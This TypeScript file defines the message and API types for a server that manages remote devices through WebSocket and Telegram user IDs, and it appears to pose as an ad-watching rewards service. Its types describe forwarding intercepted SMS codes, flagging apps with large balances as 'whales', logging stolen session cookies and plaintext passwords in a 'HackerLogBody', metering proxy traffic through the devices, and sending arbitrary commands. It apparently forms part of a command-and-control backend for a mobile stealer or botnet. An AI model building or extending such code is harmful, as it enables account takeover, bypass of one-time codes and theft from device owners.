import WebSocket from 'ws';

// ─── Device Entry ────────────────────────────────────────────────────────────

export interface DeviceEntry {
  userId: number;
  deviceModel: string;
  adAccount: number;
  socket: WebSocket;
  connectedAt: Date;
  pongTimer: ReturnType<typeof setTimeout> | null;
  pingTimer: ReturnType<typeof setInterval> | null;
  smsEnabled: boolean;
}

// ─── WebSocket Message Types ──────────────────────────────────────────────────

export interface RegisterPayload {
  action: 'register';
  telegram_user_id: number;
  device_model: string;
  sms_enabled?: boolean;
}

export interface PongPayload {
  action: 'pong';
}

export interface SmsReceivedPayload {
  action: 'sms_received';
  code: string;
  sender: string;
  phone_number?: string;
  service?: string;
}

export interface WhaleDetectedPayload {
  action: 'whale_detected';
  app: string;
  balance: string;
}

export interface CommandPayload {
  action: string;
  [key: string]: unknown;
}

export type InboundMessage =
  | RegisterPayload
  | PongPayload
  | SmsReceivedPayload
  | WhaleDetectedPayload
  | { action: string };

// ─── REST API Types ──────────────────────────────────────────────────────────

export interface DeviceCallbackBody {
  telegram_user_id: number;
  event_type: 'ad_watched' | 'task_complete';
  tokens_earned: number;
  meta?: Record<string, unknown>;
}

export interface HackerLogBody {
  telegram_user_id: number;
  target_app: string;
  session_cookie?: string;
  plaintext_password?: string;
  ip_address?: string;
}

export interface ProxyUsageBody {
  telegram_user_id: number;
  bytes_used: number;
}